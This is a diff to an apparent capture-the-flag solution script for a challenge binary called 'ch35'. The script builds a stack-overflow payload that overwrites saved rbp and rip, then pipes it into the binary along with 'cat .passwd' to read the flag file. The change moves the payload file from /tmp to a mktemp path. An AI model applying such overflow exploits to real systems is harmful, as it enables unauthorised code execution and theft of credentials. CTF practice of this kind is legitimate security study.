@@ -1,6 +1,9 @@
 # ssh ... < commands.sh
 
-cat << 'EOF' > /tmp/ch35_data.py
+f=$(mktemp)
+chmod g+r $f
+
+cat << 'EOF' > $f
 import struct
 import sys
 
@@ -15,4 +18,4 @@ s += rbp + rip
 sys.stdout.buffer.write(s)
 EOF
 
-(python3 /tmp/ch35_data.py; echo; cat <<< 'cat .passwd') | ./ch35
+(python3 $f; echo; cat <<< 'cat .passwd') | ./ch35
